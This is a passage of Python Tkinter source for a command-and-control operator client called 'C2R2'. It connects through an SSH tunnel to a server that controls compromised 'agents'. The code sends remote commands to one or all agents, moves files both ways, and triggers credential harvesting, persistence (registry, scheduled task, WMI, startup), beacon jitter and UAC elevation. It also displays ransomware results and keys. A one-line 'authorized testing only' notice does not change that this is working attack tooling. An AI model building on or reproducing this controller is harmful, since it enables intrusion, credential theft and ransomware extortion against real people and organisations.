        self.agent_context_menu.add_command(label="🔄 Refresh List", command=self._refresh_agents)
        
        # Variable to store the agent ID for context menu
        self.context_menu_agent_id = None
        
        # Right panel - Console and commands
        right_panel = ttk.Frame(main_paned, style='Panel.TFrame')
        main_paned.add(right_panel, weight=3)
        
        # Console output
        console_frame = ttk.Frame(right_panel, style='Panel.TFrame')
        console_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Label(
            console_frame,
            text="📝 Console Output",
            style='Panel.TLabel',
            font=('Consolas', 12, 'bold')
        ).pack(anchor=tk.W)
        
        self.console_output = scrolledtext.ScrolledText(
            console_frame,
            wrap=tk.WORD,
            bg=self.colors['bg'],
            fg=self.colors['fg'],
            font=('Consolas', 10),
            insertbackground=self.colors['fg']
        )
        self.console_output.pack(fill=tk.BOTH, expand=True, pady=5)
        self.console_output.config(state=tk.DISABLED)
        
        # Configure text tags for colors
        self.console_output.tag_config('info', foreground=self.colors['info'])
        self.console_output.tag_config('success', foreground=self.colors['success'])
        self.console_output.tag_config('warning', foreground=self.colors['warning'])
        self.console_output.tag_config('error', foreground=self.colors['error'])
        self.console_output.tag_config('prompt', foreground=self.colors['accent'])
        
        # Command input frame
        cmd_frame = ttk.Frame(right_panel, style='Panel.TFrame')
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.selected_label = ttk.Label(
            cmd_frame,
            text="C2R2>",
            style='Panel.TLabel',
            font=('Consolas', 11, 'bold')
        )
        self.selected_label.pack(side=tk.LEFT, padx=(0, 5))
        
        self.cmd_entry = tk.Entry(
            cmd_frame,
            bg=self.colors['input_bg'],
            fg=self.colors['fg'],
            insertbackground=self.colors['fg'],
            font=('Consolas', 11),
            relief=tk.FLAT
        )
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.cmd_entry.bind('<Return>', self._send_command)
        self.cmd_entry.bind('<Up>', self._history_up)
        self.cmd_entry.bind('<Down>', self._history_down)
        
        send_btn = tk.Button(
            cmd_frame,
            text="Send",
            bg=self.colors['accent'],
            fg='white',
            relief=tk.FLAT,
            command=lambda: self._send_command(None)
        )
        send_btn.pack(side=tk.RIGHT)
        
        # Command history
        self.cmd_history: List[str] = []
        self.history_index = -1
        
        # Quick actions frame
        actions_frame = ttk.Frame(right_panel, style='Panel.TFrame')
        actions_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(
            actions_frame,
            text="Quick Actions:",
            style='Panel.TLabel'
        ).pack(side=tk.LEFT, padx=(0, 10))
        
        quick_actions = [
            ("/list", "📋 List"),
            ("/help", "❓ Help"),
            ("/harvest", "🔑 Harvest"),
        ]
        
        for cmd, text in quick_actions:
            btn = tk.Button(
                actions_frame,
                text=text,
                bg=self.colors['panel_bg'],
                fg=self.colors['fg'],
                relief=tk.FLAT,
                command=lambda c=cmd: self._quick_command(c)
            )
            btn.pack(side=tk.LEFT, padx=2)
    
    def _connect(self):
        """Handle connection via SSH tunnel to API server."""
        self.logger.info("Connection attempt started")
        
        # Get SSH connection details
        ssh_host = self.ssh_host_entry.get().strip()
        ssh_port = self.ssh_port_entry.get().strip()
        ssh_user = self.ssh_user_entry.get().strip()
        ssh_password = self.ssh_password_entry.get()
        ssh_key = self.ssh_key_entry.get().strip()
        
        # Get API details
        api_port = self.api_port_entry.get().strip()
        username = self.username_entry.get().strip()
        api_password = self.password_entry.get()
        
        self.logger.debug(f"SSH Host: {ssh_host}")
        self.logger.debug(f"SSH Port: {ssh_port}")
        self.logger.debug(f"SSH User: {ssh_user}")
        self.logger.debug(f"SSH Key: {'<set>' if ssh_key else '<none>'}")
        self.logger.debug(f"SSH Password: {'<set>' if ssh_password else '<none>'}")
        self.logger.debug(f"API Port: {api_port}")
        self.logger.debug(f"Operator: {username}")
        
        # Save configuration if checkbox is checked
        if self.save_credentials_var.get():
            self.logger.info("Saving connection information...")
            self.config = {
                'save_credentials': True,
                'ssh_host': ssh_host,
                'ssh_port': ssh_port,
                'ssh_user': ssh_user,
                'ssh_key': ssh_key,
                'api_port': api_port,
                'username': username,
                # Note: Passwords are NOT saved for security
            }
            self._save_config()
        else:
            self.logger.debug("Save credentials checkbox not checked")
        
        # Validation
        if not ssh_host:
            self.logger.warning("Connection failed: SSH Host is required")
            self.login_status.config(text="❌ SSH Host is required", foreground=self.colors['error'])
            return
        
        if not ssh_user:
            self.logger.warning("Connection failed: SSH User is required")
            self.login_status.config(text="❌ SSH User is required", foreground=self.colors['error'])
            return
        
        if not ssh_password and not ssh_key:
            self.logger.warning("Connection failed: SSH Password or Key is required")
            self.login_status.config(text="❌ SSH Password or Key is required", foreground=self.colors['error'])
            return
        
        if not api_password:
            self.logger.warning("Connection failed: API Password is required")
            self.login_status.config(text="❌ API Password is required", foreground=self.colors['error'])
            return
        
        self.login_status.config(text="⏳ Establishing SSH tunnel...", foreground=self.colors['warning'])
        self.connect_btn.config(state=tk.DISABLED)
        self.root.update()
        
        # Connect in a separate thread to avoid blocking UI
        def connect_thread():
            self.logger.info("Connection thread started")
            try:
                ssh_port_int = int(ssh_port)
                api_port_int = int(api_port)
                self.logger.debug(f"Parsed ports - SSH: {ssh_port_int}, API: {api_port_int}")
            except ValueError as e:
                self.logger.error(f"Invalid port number: {e}")
                self.root.after(0, lambda: self._on_connect_fail("Invalid port number"))
                return
            
            # Step 1: Establish SSH tunnel
            self.logger.info(f"Step 1: Establishing SSH tunnel to {ssh_host}:{ssh_port_int}")
            ssh_success, ssh_message, local_port = self.ssh_tunnel.connect(
                host=ssh_host,
                ssh_port=ssh_port_int,
                username=ssh_user,
                password=ssh_password if ssh_password else None,
                key_path=ssh_key if ssh_key else None,
                api_port=api_port_int
            )
            
            if not ssh_success:
                self.logger.error(f"SSH tunnel failed: {ssh_message}")
                self.root.after(0, lambda: self._on_connect_fail(f"SSH: {ssh_message}"))
                return
            
            self.logger.info(f"SSH tunnel established: localhost:{local_port} -> {ssh_host}:{api_port_int}")
            self.root.after(0, lambda: self.login_status.config(
                text="⏳ SSH tunnel established. Connecting to API...", 
                foreground=self.colors['warning']
            ))
            
            # Step 2: Connect to API through the tunnel
            self.logger.info(f"Step 2: Connecting to API at 127.0.0.1:{local_port}")
            api_success, api_message = self.api.connect(
                host="127.0.0.1",
                port=local_port,
                password=api_password,
                username=username
            )
            
            if api_success:
                self.logger.info("API connection successful")
                # Start event listener
                self.logger.debug("Starting WebSocket event listener")
                self.api.start_event_listener(self._on_server_event)
                self.root.after(0, lambda: self._on_connect_success(ssh_host, local_port, api_port_int))
            else:
                self.logger.error(f"API connection failed: {api_message}")
                # Disconnect SSH if API fails
                self.ssh_tunnel.disconnect()
                self.root.after(0, lambda: self._on_connect_fail(f"API: {api_message}"))
        
        thread = threading.Thread(target=connect_thread, daemon=True)
        thread.start()
    
    def _on_server_event(self, event: dict):
        """Handle events from the WebSocket."""
        self.event_queue.put(event)
    
    def _process_event_queue(self):
        """Process events from the queue (runs in main thread)."""
        try:
            while True:
                event = self.event_queue.get_nowait()
                self._handle_event(event)
        except queue.Empty:
            pass
        
        if self.running:
            self.root.after(100, self._process_event_queue)
    
    def _handle_event(self, event: dict):
        """Handle a server event."""
        event_type = event.get("type")
        data = event.get("data", {})
        
        self.logger.debug(f"Received event: {event_type} - Data: {data}")
        
        if event_type == "AgentConnected":
            self.logger.info(f"Agent {data.get('id')} connected from {data.get('addr')}")
            self._update_agent(data)
            self._log_console(f"✅ Agent {data.get('id')} connected from {data.get('addr')}\n", 'success')
        
        elif event_type == "AgentDisconnected":
            agent_id = data.get("id")
            self._remove_agent(agent_id)
            self._log_console(f"❌ Agent {agent_id} disconnected\n", 'error')
        
        elif event_type == "AgentUpdated":
            self._update_agent(data)
        
        elif event_type == "CommandOutput":
            agent_id = data.get("agent_id")
            output = data.get("output", "")
            is_error = data.get("is_error", False)
            
            # Regular command output - log to console
            tag = 'error' if is_error else None
            self._log_console(f"📨 [{agent_id}]: {output}\n", tag)
        
        elif event_type == "DirectoryListing":
            # New directory listing event from server
            agent_id = data.get("agent_id")
            path = data.get("path", "")
            entries = data.get("entries", [])
            self._handle_directory_listing(agent_id, path, entries)
        
        elif event_type == "CwdChanged":
            # Current working directory changed
            agent_id = data.get("agent_id")
            cwd = data.get("cwd", "")
            self._handle_cwd_changed(agent_id, cwd)
        
        elif event_type == "FileDownloaded":
            self._log_console(
                f"📥 File downloaded from agent {data.get('agent_id')}: "
                f"{data.get('filename')} ({data.get('size')} bytes) -> {data.get('save_path')}\n",
                'success'
            )
        
        elif event_type == "CredentialsHarvested":
            self._log_console(
                f"🔑 Credentials harvested from agent {data.get('agent_id')}: "
                f"{data.get('count')} entries -> {data.get('save_path')}\n",
                'success'
            )
        
        elif event_type == "RansomwareResult":
            self._log_console(
                f"🔐 Ransomware {data.get('operation')} on agent {data.get('agent_id')}: "
                f"{data.get('result')}\n",
                'warning'
            )
            if data.get("key"):
                self._log_console(f"   Key: {data.get('key')}\n", 'warning')
        
        elif event_type == "ServerMessage":
            level = data.get("level", "info")
            message = data.get("message", "")
            tag = {'info': 'info', 'warning': 'warning', 'error': 'error'}.get(level, None)
            self._log_console(f"ℹ️ Server: {message}\n", tag)
    
    def _handle_directory_listing(self, agent_id: int, path: str, entries: list):
        """Handle directory listing event from server."""
        # Check if file explorer is open for this agent
        if agent_id not in self.file_explorer_data:
            return
        
        explorer_data = self.file_explorer_data[agent_id]
        tree = explorer_data.get('tree')
        status_var = explorer_data.get('status_var')
        path_var = explorer_data.get('path_var')
        
        if not tree or not status_var:
            return
        
        try:
            # Update path display
            if path_var:
                path_var.set(path)
            
            # Clear existing items
            for item in tree.get_children():
                tree.delete(item)
            
            # Parse and display entries
            for entry in entries:
                name = entry.get('name', '')
                is_dir = entry.get('is_dir', False)
                size = entry.get('size', 0)
                
                # Format display
                file_type = "📁 Folder" if is_dir else "📄 File"
                size_display = "" if is_dir else f"{size:,} bytes"
                
                # Store is_dir as the last column for navigation logic
                tree.insert('', 'end', values=(name, file_type, size_display, 'D' if is_dir else 'F'))
            
            status_var.set(f"📂 {path} - {len(entries)} items")
            self.logger.info(f"File explorer updated for agent {agent_id}: {path} ({len(entries)} items)")
            
        except Exception as e:
            self.logger.error(f"Error handling directory listing: {e}")
            status_var.set(f"Error loading directory")
    
    def _handle_cwd_changed(self, agent_id: int, cwd: str):
        """Handle current working directory change event."""
        # Update agent info with new cwd
        if agent_id in self.agents:
            self.agents[agent_id]['cwd'] = cwd
        
        # Update prompt if this is the selected agent
        if self.selected_client == agent_id:
            self._update_prompt()
        
        # Update file explorer if open
        if agent_id in self.file_explorer_data:
            explorer_data = self.file_explorer_data[agent_id]
            path_var = explorer_data.get('path_var')
            if path_var:
                path_var.set(cwd)
        
        self._log_console(f"📁 [{agent_id}] CWD: {cwd}\n", 'info')
    
    def _on_connect_success(self, ssh_host: str, local_port: int, remote_api_port: int):
        """Handle successful connection."""
        self.login_frame.pack_forget()
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        self.connection_label.config(
            text=f"🔐 SSH Tunnel: {ssh_host} (localhost:{local_port} → API:{remote_api_port})",
            foreground=self.colors['success']
        )
        
        # Log to console
        self._log_console(f"✅ SSH tunnel established to {ssh_host}\n", 'success')
        self._log_console(f"✅ Local port {local_port} tunneled to remote API port {remote_api_port}\n", 'success')
        self._log_console("✅ Connected to C2R2 Server API\n", 'success')
        self._log_console("Type /help for available commands\n", 'info')
        
        # Load initial agent list
        self._refresh_agents()
    
    def _on_connect_fail(self, message: str):
        """Handle connection failure."""
        self.login_status.config(text=f"❌ {message}", foreground=self.colors['error'])
        self.connect_btn.config(state=tk.NORMAL)
    
    def _disconnect(self):
        """Disconnect from the server and SSH tunnel."""
        self.api.disconnect()
        self.ssh_tunnel.disconnect()
        
        self.main_frame.pack_forget()
        self.login_frame.pack(fill=tk.BOTH, expand=True)
        self.login_status.config(text="")
        self.connect_btn.config(state=tk.NORMAL)
        
        # Clear agents list
        for item in self.agents_tree.get_children():
            self.agents_tree.delete(item)
        self.agents.clear()
        self._agent_tree_items.clear()
        self.selected_client = None
        self._update_prompt()
    
    def _refresh_agents(self):
        """Refresh the agents list from the server."""
        if not self.api.connected:
            return
        
        def refresh_thread():
            success, data = self.api.get_agents()
            if success:
                agents_list = data.get("agents", [])
                self.root.after(0, lambda: self._update_agents_list(agents_list))
            else:
                self.root.after(0, lambda: self._log_console(f"❌ Failed to refresh agents: {data}\n", 'error'))
        
        threading.Thread(target=refresh_thread, daemon=True).start()
    
    def _update_agents_list(self, agents_list: List[dict]):
        """Update the agents list from server response."""
        # Clear current list
        for item in self.agents_tree.get_children():
            self.agents_tree.delete(item)
        self.agents.clear()
        self._agent_tree_items.clear()
        
        # Add agents
        for agent in agents_list:
            self._update_agent(agent)
    
    def _update_agent(self, agent_info: dict):
        """Update or add an agent to the tree."""
        agent_id = agent_info.get('id')
        if agent_id is None:
            return
        
        # Check if agent already exists
        if agent_id in self._agent_tree_items:
            item = self._agent_tree_items[agent_id]
            if self.agents_tree.exists(item):
                privileges = agent_info.get('privileges', '...')
                self.agents_tree.item(item, values=(
                    agent_id,
                    agent_info.get('hostname') or agent_info.get('addr', '...'),
                    agent_info.get('username', '...'),
                    agent_info.get('os_version', '...'),
                    privileges
                ))
                # Apply admin tag if privileges are Admin
                if privileges == 'Admin':
                    self.agents_tree.item(item, tags=('admin',))
                else:
                    self.agents_tree.item(item, tags=())
                self.agents[agent_id] = agent_info
                return
        
        # Add new agent
        privileges = agent_info.get('privileges', '...')
        tags = ('admin',) if privileges == 'Admin' else ()
        item = self.agents_tree.insert('', tk.END, values=(
            agent_id,
            agent_info.get('hostname') or agent_info.get('addr', '...'),
            agent_info.get('username', '...'),
            agent_info.get('os_version', '...'),
            privileges
        ), tags=tags)
        self._agent_tree_items[agent_id] = item
        self.agents[agent_id] = agent_info
    
    def _remove_agent(self, agent_id: int):
        """Remove an agent from the tree."""
        if agent_id in self._agent_tree_items:
            item = self._agent_tree_items[agent_id]
            if self.agents_tree.exists(item):
                self.agents_tree.delete(item)
            del self._agent_tree_items[agent_id]
        
        if agent_id in self.agents:
            del self.agents[agent_id]
        
        if self.selected_client == agent_id:
            self.selected_client = None
            self._update_prompt()
    
    def _log_console(self, text: str, tag: Optional[str] = None):
        """Log text to the console output."""
        self.console_output.config(state=tk.NORMAL)
        if tag:
            self.console_output.insert(tk.END, text, tag)
        else:
            self.console_output.insert(tk.END, text)
        self.console_output.see(tk.END)
        self.console_output.config(state=tk.DISABLED)
    
    def _on_agent_select(self, event):
        """Handle agent selection in treeview."""
        selection = self.agents_tree.selection()
        if selection:
            item = selection[0]
            values = self.agents_tree.item(item)['values']
            agent_id = int(values[0])
            
            self.selected_client = agent_id
            self._update_prompt()
    
    def _on_agent_double_click(self, event):
        """Handle double-click on agent."""
        selection = self.agents_tree.selection()
        if selection:
            item = selection[0]
            values = self.agents_tree.item(item)['values']
            agent_id = int(values[0])
            
            # Show agent info
            agent_info = self.agents.get(agent_id, {})
            self._log_console(f"\n📋 Agent [{agent_id}] Info:\n", 'info')
            self._log_console(f"   Address: {agent_info.get('addr', 'N/A')}\n")
            self._log_console(f"   Hostname: {agent_info.get('hostname', 'N/A')}\n")
            self._log_console(f"   Username: {agent_info.get('username', 'N/A')}\n")
            self._log_console(f"   OS: {agent_info.get('os_version', 'N/A')}\n")
            self._log_console(f"   Privileges: {agent_info.get('privileges', 'N/A')}\n")
            self._log_console(f"   Connected: {agent_info.get('connected_at', 'N/A')}\n\n")
    
    def _update_prompt(self):
        """Update the command prompt."""
        if self.selected_client:
            # Show agent ID and CWD if available
            agent_info = self.agents.get(self.selected_client, {})
            cwd = agent_info.get('cwd', '')
            if cwd:
                # Shorten the path if too long
                if len(cwd) > 30:
                    cwd_display = "..." + cwd[-27:]
                else:
                    cwd_display = cwd
                self.selected_label.config(text=f"C2R2[{self.selected_client}:{cwd_display}]>")
            else:
                self.selected_label.config(text=f"C2R2[{self.selected_client}]>")
        else:
            self.selected_label.config(text="C2R2>")
    
    def _send_command(self, event):
        """Send command from the entry field."""
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        
        # Add to history
        self.cmd_history.append(cmd)
        self.history_index = len(self.cmd_history)
        
        # Clear entry
        self.cmd_entry.delete(0, tk.END)
        
        # Log the command
        self._log_console(f">>> {cmd}\n", 'prompt')
        
        # Parse and execute command
        parts = cmd.split()
        if not parts:
            return
        
        command = parts[0].lower()
        
        # Handle local commands
        if command == '/list':
            self._refresh_agents()
        
        elif command == '/select' and len(parts) >= 2:
            try:
                agent_id = int(parts[1])
                if agent_id in self.agents:
                    self.selected_client = agent_id
                    self._update_prompt()
                    self._log_console(f"✅ Selected agent {agent_id}\n", 'success')
                else:
                    self._log_console(f"❌ Agent {agent_id} not found\n", 'error')
            except ValueError:
                self._log_console("❌ Invalid agent ID\n", 'error')
        
        elif command == '/deselect':
            self.selected_client = None
            self._update_prompt()
            self._log_console("✅ Deselected agent\n", 'success')
        
        elif command == '/help':
            self._show_commands_help()
        
        elif command == '/cmd' and len(parts) >= 2:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                cmd_text = ' '.join(parts[1:])
                self._execute_command(self.selected_client, cmd_text)
        
        elif command == '/cmd_all' and len(parts) >= 2:
            cmd_text = ' '.join(parts[1:])
            self._execute_command_all(cmd_text)
        
        elif command == '/download' and len(parts) >= 2:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                remote_path = ' '.join(parts[1:])
                self._download_file(self.selected_client, remote_path)
        
        elif command == '/upload' and len(parts) >= 3:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                local_path = parts[1]
                remote_path = ' '.join(parts[2:])
                if not Path(local_path).exists():
                    self._log_console(f"❌ Local file not found: {local_path}\n", 'error')
                else:
                    self._upload_file(self.selected_client, local_path, remote_path)
        
        elif command == '/harvest':
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                self._harvest_credentials(self.selected_client)
        
        elif command == '/persist' and len(parts) >= 2:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                method = parts[1]
                self._set_persistence(self.selected_client, method)
        
        elif command == '/beacon' and len(parts) >= 2:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                try:
                    config = parts[1].split(':')
                    interval = int(config[0])
                    jitter = int(config[1]) if len(config) > 1 else 0
                    self._configure_beacon(self.selected_client, interval, jitter)
                except (ValueError, IndexError):
                    self._log_console("❌ Invalid beacon config. Use /beacon <interval:jitter>\n", 'error')
        
        elif command == '/elevate':
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                self._elevate_agent(self.selected_client)
        
        elif command == '/cd' and len(parts) >= 2:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                path = ' '.join(parts[1:])
                self._change_directory(self.selected_client, path)
        
        elif command == '/pwd':
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                self._get_pwd(self.selected_client)
        
        elif command == '/ls':
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                # List current directory
                path = ' '.join(parts[1:]) if len(parts) > 1 else ""
                self._list_directory(self.selected_client, path)
        
        else:
            self._log_console(f"❌ Unknown command: {command}. Use /help\n", 'error')
    
    def _execute_command(self, agent_id: int, command: str):
        """Execute a command on an agent."""
        self.logger.info(f"Executing command on agent {agent_id}: {command}")
        def execute_thread():
            success, message = self.api.send_command(agent_id, command)
            tag = 'success' if success else 'error'
            if success:
                self.logger.debug(f"Command sent successfully to agent {agent_id}")
            else:
                self.logger.error(f"Failed to send command to agent {agent_id}: {message}")
            self.root.after(0, lambda: self._log_console(f"📤 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=execute_thread, daemon=True).start()
    
    def _execute_command_all(self, command: str):
        """Execute a command on all agents."""
        def execute_thread():
            success, results = self.api.send_command_all(command)
            if success:
                for result in results:
                    tag = 'success' if result.get('success') else 'error'
                    self.root.after(0, lambda r=result, t=tag: self._log_console(
                        f"📤 [{r.get('agent_id')}]: {r.get('message')}\n", t
                    ))
            else:
                self.root.after(0, lambda: self._log_console(f"❌ Failed: {results}\n", 'error'))
        
        threading.Thread(target=execute_thread, daemon=True).start()
    
    def _download_file(self, agent_id: int, remote_path: str):
        """Request file download from agent."""
        self.logger.info(f"Downloading file from agent {agent_id}: {remote_path}")
        def download_thread():
            success, message = self.api.download_file(agent_id, remote_path)
            tag = 'success' if success else 'error'
            if success:
                self.logger.info(f"Download request sent for {remote_path}")
            else:
                self.logger.error(f"Download failed: {message}")
            self.root.after(0, lambda: self._log_console(f"📥 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=download_thread, daemon=True).start()
    
    def _upload_file(self, agent_id: int, local_path: str, remote_path: str):
        """Upload a file to an agent."""
        self.logger.info(f"Uploading file to agent {agent_id}: {local_path} -> {remote_path}")
        def upload_thread():
            success, message = self.api.upload_file(agent_id, local_path, remote_path)
            tag = 'success' if success else 'error'
            if success:
                self.logger.info(f"Upload request sent for {local_path}")
            else:
                self.logger.error(f"Upload failed: {message}")
            self.root.after(0, lambda: self._log_console(f"📤 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=upload_thread, daemon=True).start()
    
    def _harvest_credentials(self, agent_id: int):
        """Trigger credential harvesting."""
        def harvest_thread():
            success, message = self.api.harvest_credentials(agent_id)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"🔑 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=harvest_thread, daemon=True).start()
    
    def _set_persistence(self, agent_id: int, method: str):
        """Set persistence on agent."""
        def persist_thread():
            success, message = self.api.set_persistence(agent_id, method)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"📌 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=persist_thread, daemon=True).start()
    
    def _configure_beacon(self, agent_id: int, interval: int, jitter: int):
        """Configure beacon timing."""
        def beacon_thread():
            success, message = self.api.configure_beacon(agent_id, interval, jitter)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"📡 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=beacon_thread, daemon=True).start()
    
    def _elevate_agent(self, agent_id: int):
        """Elevate agent to admin."""
        def elevate_thread():
            success, message = self.api.elevate_agent(agent_id)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"⬆️ [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=elevate_thread, daemon=True).start()
    
    def _change_directory(self, agent_id: int, path: str):
        """Change current directory on agent."""
        def cd_thread():
            success, message = self.api.change_directory(agent_id, path)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"📁 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=cd_thread, daemon=True).start()
    
    def _get_pwd(self, agent_id: int):
        """Get current working directory of agent."""
        def pwd_thread():
            success, message = self.api.get_pwd(agent_id)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"📁 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=pwd_thread, daemon=True).start()
    
    def _list_directory(self, agent_id: int, path: str):
        """List directory on agent."""
        def ls_thread():
            success, message = self.api.list_directory(agent_id, path)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"📂 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=ls_thread, daemon=True).start()
    
    def _quick_command(self, cmd: str):
        """Execute a quick action command."""
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, cmd)
        self._send_command(None)
    
    def _history_up(self, event):
        """Navigate command history up."""
        if self.cmd_history and self.history_index > 0:
            self.history_index -= 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.cmd_history[self.history_index])
    
    def _history_down(self, event):
        """Navigate command history down."""
        if self.cmd_history and self.history_index < len(self.cmd_history) - 1:
            self.history_index += 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.cmd_history[self.history_index])
        else:
            self.history_index = len(self.cmd_history)
            self.cmd_entry.delete(0, tk.END)
    
    def _show_about(self):
        """Show about dialog."""
        messagebox.showinfo(
            "About C2R2 Team Client",
            "C2R2 Team Client v2.0\n\n"
            "A graphical interface for connecting to\n"
            "C2R2 Command & Control servers via API.\n\n"
            "Architecture:\n"
            "- Server runs on red team infrastructure\n"
            "- Operators connect via HTTP/WebSocket API\n"
            "- GUI displays connected agents\n\n"
            "⚠️ FOR AUTHORIZED SECURITY TESTING ONLY"
        )
    
    def _show_commands_help(self):
        """Show commands help dialog."""
        help_text = """
📋 Client Management:
   /list                  - List all connected clients
   /select <id>           - Select a client by ID
   /deselect              - Deselect current client

💻 Command Execution:
   /cmd <command>         - Execute command on selected client
   /cmd_all <cmd>         - Execute on ALL clients

📁 File & Directory Operations:
   /ls [path]             - List directory (current dir if no path)
   /cd <path>             - Change current directory
   /pwd                   - Show current working directory
   /download <path>       - Download file from agent
   /upload <local> <remote> - Upload file to agent

🔧 Advanced Operations:
   /harvest               - Harvest credentials
   /persist <method>      - Establish persistence (registry|task|wmi|startup)
   /beacon <int:jit>      - Configure beacon timing (e.g., 60:30)
   /elevate               - Elevate to admin (UAC prompt)

ℹ️ Other:
   /help                  - Show this help

💡 TIP: Right-click on an agent for quick actions and File Explorer!
"""
        # Create a new window for help
        help_window = tk.Toplevel(self.root)
        help_window.title("C2R2 Commands Help")
        help_window.geometry("500x500")
        help_window.configure(bg=self.colors['bg'])
        
        text = scrolledtext.ScrolledText(
            help_window,
            wrap=tk.WORD,
            bg=self.colors['bg'],
            fg=self.colors['fg'],
            font=('Consolas', 10)
        )
        text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        text.insert(tk.END, help_text)
        text.config(state=tk.DISABLED)
    
    def _show_agent_context_menu(self, event):
        """Show context menu on right-click."""
        # Select the item under cursor
        item = self.agents_tree.identify_row(event.y)
        if item:
            self.agents_tree.selection_set(item)
            values = self.agents_tree.item(item)['values']
            self.context_menu_agent_id = int(values[0])
            
            # Show the menu at cursor position
            try:
                self.agent_context_menu.tk_popup(event.x_root, event.y_root)
            finally:
                self.agent_context_menu.grab_release()
    
    def _context_select_agent(self):
        """Select agent from context menu."""
        if self.context_menu_agent_id:
            self.selected_client = self.context_menu_agent_id
            self._update_prompt()
            self._log_console(f"✅ Selected agent {self.context_menu_agent_id}\n", 'success')
    
    def _context_show_info(self):
        """Show agent info from context menu."""
        if self.context_menu_agent_id:
            agent_info = self.agents.get(self.context_menu_agent_id, {})
            self._log_console(f"\n📋 Agent [{self.context_menu_agent_id}] Info:\n", 'info')
            self._log_console(f"   Address: {agent_info.get('addr', 'N/A')}\n")
            self._log_console(f"   Hostname: {agent_info.get('hostname', 'N/A')}\n")
            self._log_console(f"   Username: {agent_info.get('username', 'N/A')}\n")
            self._log_console(f"   OS: {agent_info.get('os_version', 'N/A')}\n")
            self._log_console(f"   Privileges: {agent_info.get('privileges', 'N/A')}\n")
            self._log_console(f"   Connected: {agent_info.get('connected_at', 'N/A')}\n\n")
    
    def _context_execute_command(self):
        """Execute command from context menu."""
        if not self.context_menu_agent_id:
            return
        
        # Create dialog for command input
        dialog = tk.Toplevel(self.root)
        dialog.title(f"Execute Command on Agent {self.context_menu_agent_id}")
        dialog.geometry("500x150")
        dialog.configure(bg=self.colors['bg'])
        dialog.transient(self.root)
        dialog.grab_set()
        
        ttk.Label(dialog, text="Enter command to execute:", style='Dark.TLabel').pack(pady=10)
        
        cmd_entry = tk.Entry(dialog, width=60, bg=self.colors['input_bg'], 
                            fg=self.colors['fg'], font=('Consolas', 11))
        cmd_entry.pack(pady=10, padx=20)
        cmd_entry.focus()
        
        def execute():
            command = cmd_entry.get().strip()
            if command:
                self._execute_command(self.context_menu_agent_id, command)
                dialog.destroy()
        
        cmd_entry.bind('<Return>', lambda e: execute())
        
        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="Execute", bg=self.colors['accent'], fg='white',
                 relief=tk.FLAT, command=execute, padx=20).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
    
    def _context_download_file(self):
        """Download file from context menu."""
        if not self.context_menu_agent_id:
            return
        
        # Create dialog for file path input
        dialog = tk.Toplevel(self.root)
        dialog.title(f"Download File from Agent {self.context_menu_agent_id}")
        dialog.geometry("500x150")
        dialog.configure(bg=self.colors['bg'])
        dialog.transient(self.root)
        dialog.grab_set()
        
        ttk.Label(dialog, text="Enter remote file path:", style='Dark.TLabel').pack(pady=10)
        
        path_entry = tk.Entry(dialog, width=60, bg=self.colors['input_bg'], 
                             fg=self.colors['fg'], font=('Consolas', 11))
        path_entry.pack(pady=10, padx=20)
        path_entry.insert(0, "C:\\")
        path_entry.focus()
        
        def download():
            path = path_entry.get().strip()
            if path:
                self._download_file(self.context_menu_agent_id, path)
                dialog.destroy()
        
        path_entry.bind('<Return>', lambda e: download())
        
        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="Download", bg=self.colors['accent'], fg='white',
                 relief=tk.FLAT, command=download, padx=20).pack(side=tk.LEFT, padx=5)
